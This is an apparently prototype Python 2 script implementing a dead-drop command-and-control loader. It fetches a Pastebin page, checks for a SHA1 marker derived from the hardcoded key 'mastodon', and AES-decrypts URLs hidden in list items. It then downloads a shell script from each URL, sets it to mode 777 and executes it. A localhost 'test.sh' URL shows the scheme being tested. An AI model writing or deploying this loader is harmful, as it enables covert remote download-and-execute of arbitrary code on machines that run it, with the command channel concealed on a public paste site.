import requests
import hashlib
import base64
import os
from Crypto import Random
from Crypto.Cipher import AES
from bs4 import BeautifulSoup

class AESCipher:

    def __init__( self, key ):
        self.key = key

    def encrypt( self, raw ):
        raw = pad(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) )

    def decrypt( self, enc ):
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc[16:] ))

key = 'mastodon'
r = requests.get('https://pastebin.com/84ud7jjd')

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]

find_key = hashlib.sha1('mastodon').hexdigest()
print(find_key)
crypt = hashlib.sha256(key.encode('utf-8')).digest()

data = r.text

cipher = AESCipher(crypt)
encrypted = cipher.encrypt('http://127.0.0.1:9999/test.sh')
decrypted = cipher.decrypt(encrypted)
print encrypted
print decrypted

found = data.find(find_key)

if found is not -1:
    soup = BeautifulSoup(data)
    for tag in soup.find_all('ol'):
        instruction = tag.text.split(":")[1]
        instruction = instruction.strip(' ')
        instruction = cipher.decrypt(instruction)
        r = requests.get(instruction)
        
        f = open('run.sh', 'w')
        f.writelines(r.text)
        f.close()
        os.system('chmod 777 run.sh')
        os.system('./run.sh; say it ran')
else:
    import sys
    sys.exit(0)
